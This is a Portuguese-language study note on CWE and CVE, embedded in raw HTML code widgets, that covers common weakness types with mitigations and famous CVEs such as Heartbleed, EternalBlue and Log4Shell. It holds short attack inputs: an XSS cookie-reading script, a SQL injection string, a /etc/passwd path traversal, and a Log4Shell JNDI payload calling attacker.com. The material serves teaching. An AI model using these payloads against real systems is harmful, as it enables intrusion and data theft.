
# 🔍 CWE e CVE - Identificação de Vulnerabilidades

> **Tags:** #cwe #cve #vulnerabilidades #security #nvd #mitre #exploit #patch-management

---

## 📌 Visão Geral

**CWE** e **CVE** são sistemas de catalogação e identificação de vulnerabilidades e fraquezas em software e hardware, mantidos pelo **MITRE Corporation**.

---

## 🐛 CWE (Common Weakness Enumeration)

### Conceito

**CWE** é uma lista categorizada de **tipos de fraquezas** de software e hardware que podem levar a vulnerabilidades.

🎯 **Objetivo:** Classificar e descrever **tipos de falhas** (não vulnerabilidades específicas).

### Estrutura

CWE-ID: Número único Nome: Descrição curta Descrição: Explicação detalhada Exemplos: Casos reais Mitigação: Como prevenir


---

### Exemplos de CWEs Importantes

#### CWE-79: Cross-Site Scripting (XSS)
**Descrição:** Falha que permite injeção de scripts maliciosos em páginas web.

**Exemplo:**
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">html</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-1ywrxe8b4" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-html" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic">&lt;!-- Vulnerável --&gt;</span><span>
</span><span></span><span class="token" style="color:rgb(199, 146, 234)">&lt;</span><span class="token" style="color:rgb(127, 219, 202)">div</span><span class="token" style="color:rgb(199, 146, 234)">&gt;</span><span>Bem-vindo, </span><span class="token" style="color:rgb(99, 119, 119);font-style:italic">&lt;?php echo $_GET[&#x27;nome&#x27;]; ?&gt;</span><span class="token" style="color:rgb(199, 146, 234)">&lt;/</span><span class="token" style="color:rgb(127, 219, 202)">div</span><span class="token" style="color:rgb(199, 146, 234)">&gt;</span><span>
</span>
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic">&lt;!-- Ataque --&gt;</span><span>
</span><span>http://site.com?nome=</span><span class="token" style="color:rgb(199, 146, 234)">&lt;</span><span class="token" style="color:rgb(127, 219, 202)">script</span><span class="token" style="color:rgb(199, 146, 234)">&gt;</span><span class="token script language-javascript" style="color:rgb(130, 170, 255)">alert</span><span class="token script language-javascript" style="color:rgb(199, 146, 234)">(</span><span class="token script language-javascript dom" style="color:rgb(214, 222, 235)">document</span><span class="token script language-javascript" style="color:rgb(199, 146, 234)">.</span><span class="token script language-javascript property-access">cookie</span><span class="token script language-javascript" style="color:rgb(199, 146, 234)">)</span><span class="token" style="color:rgb(199, 146, 234)">&lt;/</span><span class="token" style="color:rgb(127, 219, 202)">script</span><span class="token" style="color:rgb(199, 146, 234)">&gt;</span><span>
</span></code></pre></div>

**Mitigação:**
- Sanitização de inputs
- Output encoding
- Content Security Policy (CSP)

---

#### CWE-89: SQL Injection
**Descrição:** Injeção de comandos SQL maliciosos em queries.

**Exemplo vulnerável:**
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">php</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-1nve7c51u" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-php" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(214, 222, 235)">$query</span><span> </span><span class="token" style="color:rgb(127, 219, 202)">=</span><span> </span><span class="token double-quoted-string" style="color:rgb(173, 219, 103)">&quot;SELECT * FROM users WHERE username = &#x27;&quot;</span><span> </span><span class="token" style="color:rgb(127, 219, 202)">.</span><span> </span><span class="token global">$_POST</span><span class="token" style="color:rgb(199, 146, 234)">[</span><span class="token single-quoted-string" style="color:rgb(173, 219, 103)">&#x27;user&#x27;</span><span class="token" style="color:rgb(199, 146, 234)">]</span><span> </span><span class="token" style="color:rgb(127, 219, 202)">.</span><span> </span><span class="token double-quoted-string" style="color:rgb(173, 219, 103)">&quot;&#x27;&quot;</span><span class="token" style="color:rgb(199, 146, 234)">;</span><span>
</span></code></pre></div>

**Ataque:**
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">sql</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-oqd4eji6b" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-sql" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(173, 219, 103)">&#x27; OR &#x27;</span><span class="token" style="color:rgb(247, 140, 108)">1</span><span class="token" style="color:rgb(173, 219, 103)">&#x27;=&#x27;</span><span class="token" style="color:rgb(247, 140, 108)">1</span><span>&#x27; </span><span class="token" style="color:rgb(99, 119, 119);font-style:italic">--</span><span>
</span></code></pre></div>

**Mitigação:**
- Prepared Statements
- ORM
- Input validation

---

#### CWE-798: Hard-Coded Credentials
**Descrição:** Credenciais embutidas no código-fonte.

**Exemplo vulnerável:**
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">python</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-iv882o5rp" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-python" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>DB_PASSWORD </span><span class="token" style="color:rgb(127, 219, 202)">=</span><span> </span><span class="token" style="color:rgb(173, 219, 103)">&quot;admin123&quot;</span><span>  </span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># ❌ NUNCA FAÇA ISSO!</span><span>
</span></code></pre></div>

**Mitigação:**
- Variáveis de ambiente
- Vaults (HashiCorp Vault, AWS Secrets Manager)
- Arquivos de configuração externos (não versionados)

---

#### CWE-22: Path Traversal
**Descrição:** Acesso a arquivos fora do diretório permitido.

**Exemplo vulnerável:**
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">php</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-4688u239j" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-php" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(214, 222, 235)">$file</span><span> </span><span class="token" style="color:rgb(127, 219, 202)">=</span><span> </span><span class="token global">$_GET</span><span class="token" style="color:rgb(199, 146, 234)">[</span><span class="token single-quoted-string" style="color:rgb(173, 219, 103)">&#x27;arquivo&#x27;</span><span class="token" style="color:rgb(199, 146, 234)">]</span><span class="token" style="color:rgb(199, 146, 234)">;</span><span>
</span><span></span><span class="token" style="color:rgb(127, 219, 202)">include</span><span class="token" style="color:rgb(199, 146, 234)">(</span><span class="token double-quoted-string" style="color:rgb(173, 219, 103)">&quot;/var/www/uploads/&quot;</span><span> </span><span class="token" style="color:rgb(127, 219, 202)">.</span><span> </span><span class="token" style="color:rgb(214, 222, 235)">$file</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span class="token" style="color:rgb(199, 146, 234)">;</span><span>
</span></code></pre></div>

**Ataque:**
```

?arquivo=../../../../etc/passwd

```
**Mitigação:**
- Validação de paths
- Whitelist de arquivos permitidos
- Chroot/jail

---

#### CWE-502: Deserialization of Untrusted Data
**Descrição:** Desserialização de dados não confiáveis pode executar código arbitrário.

**Exemplo vulnerável (Python):**
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">python</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-08njdbjqu" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-python" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(127, 219, 202)">import</span><span> pickle
</span><span>data </span><span class="token" style="color:rgb(127, 219, 202)">=</span><span> pickle</span><span class="token" style="color:rgb(199, 146, 234)">.</span><span>loads</span><span class="token" style="color:rgb(199, 146, 234)">(</span><span>user_input</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span>  </span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># ❌ PERIGOSO!</span><span>
</span></code></pre></div>

**Mitigação:**
- Usar JSON ao invés de pickle/serialize
- Validar dados antes de desserializar
- Assinar dados serializados

---

### CWE Top 25 (2023)

| Rank | CWE-ID | Nome |
|------|--------|------|
| 1 | CWE-787 | Out-of-bounds Write |
| 2 | CWE-79 | Cross-site Scripting (XSS) |
| 3 | CWE-89 | SQL Injection |
| 4 | CWE-20 | Improper Input Validation |
| 5 | CWE-125 | Out-of-bounds Read |
| 6 | CWE-78 | OS Command Injection |
| 7 | CWE-416 | Use After Free |
| 8 | CWE-22 | Path Traversal |
| 9 | CWE-352 | CSRF |
| 10 | CWE-434 | Unrestricted Upload of File |

**Site oficial:** [cwe.mitre.org](https://cwe.mitre.org/)

---

## 🚨 CVE (Common Vulnerabilities and Exposures)

### Conceito

**CVE** é um identificador único para **vulnerabilidades específicas** descobertas em software e hardware.

🎯 **Objetivo:** Catalogar e referenciar vulnerabilidades conhecidas publicamente.

### Estrutura do CVE ID
```

CVE-YYYY-NNNNN

CVE: Prefixo fixo YYYY: Ano da atribuição NNNNN: Número sequencial (4-7 dígitos)

```
**Exemplo:** `CVE-2021-44228` (Log4Shell)

---

### Anatomia de um CVE

<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">yaml</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-qai3nrz38" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-yaml" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token key" style="color:rgb(255, 203, 139)">CVE-ID</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span> CVE</span><span class="token" style="color:rgb(199, 146, 234)">-</span><span>2021</span><span class="token" style="color:rgb(199, 146, 234)">-</span><span class="token" style="color:rgb(247, 140, 108)">44228</span><span>
</span><span></span><span class="token key" style="color:rgb(255, 203, 139)">Nome</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span> Log4Shell
</span><span></span><span class="token key" style="color:rgb(255, 203, 139)">Descrição</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span> RCE via JNDI lookup no Apache Log4j
</span><span></span><span class="token key" style="color:rgb(255, 203, 139)">CVSS Score</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span> 10.0 (CRÍTICO)
</span><span></span><span class="token key" style="color:rgb(255, 203, 139)">Vetor de Ataque</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span> CVSS</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span>3.1/AV</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span>N/AC</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span>L/PR</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span>N/UI</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span>N/S</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span>C/C</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span>H/I</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span>H/A</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span>H
</span><span></span><span class="token key" style="color:rgb(255, 203, 139)">Data de Publicação</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span> </span><span class="token datetime" style="color:rgb(247, 140, 108)">2021-12-10</span><span>
</span><span></span><span class="token key" style="color:rgb(255, 203, 139)">Produtos Afetados</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span> Apache Log4j 2.0</span><span class="token" style="color:rgb(199, 146, 234)">-</span><span>beta9 até 2.14.1
</span><span></span><span class="token key" style="color:rgb(255, 203, 139)">CWE Relacionado</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span> CWE</span><span class="token" style="color:rgb(199, 146, 234)">-</span><span>502 (Deserialization)
</span><span></span><span class="token key" style="color:rgb(255, 203, 139)">Patch Disponível</span><span class="token" style="color:rgb(199, 146, 234)">:</span><span> Atualizar para 2.15.0+
</span></code></pre></div>

---

### Exemplos de CVEs Famosos

#### CVE-2014-0160 (Heartbleed)
**Descrição:** Vazamento de memória no OpenSSL permitindo roubo de chaves privadas.

**Impacto:** Crítico - Exposição de dados sensíveis

**Afetados:** OpenSSL 1.0.1 até 1.0.1f

**Mitigação:** Atualizar para OpenSSL 1.0.1g+

---

#### CVE-2017-0144 (EternalBlue)
**Descrição:** RCE no protocolo SMBv1 do Windows.

**Impacto:** Crítico - Explorado pelo WannaCry e NotPetya

**Afetados:** Windows Vista até Windows 10

**Mitigação:** Aplicar patch MS17-010 e desabilitar SMBv1

---

#### CVE-2021-44228 (Log4Shell)
**Descrição:** RCE via JNDI lookup no Apache Log4j.

**Payload:**
```

${jndi:ldap://attacker.com/exploit}

```
**Impacto:** Crítico - Milhões de sistemas afetados

**Mitigação:** Atualizar Log4j para 2.17.1+

---

#### CVE-2014-6271 (Shellshock)
**Descrição:** Execução de comandos arbitrários via variáveis de ambiente no Bash.

**Payload:**
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-dscchkx4j" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, 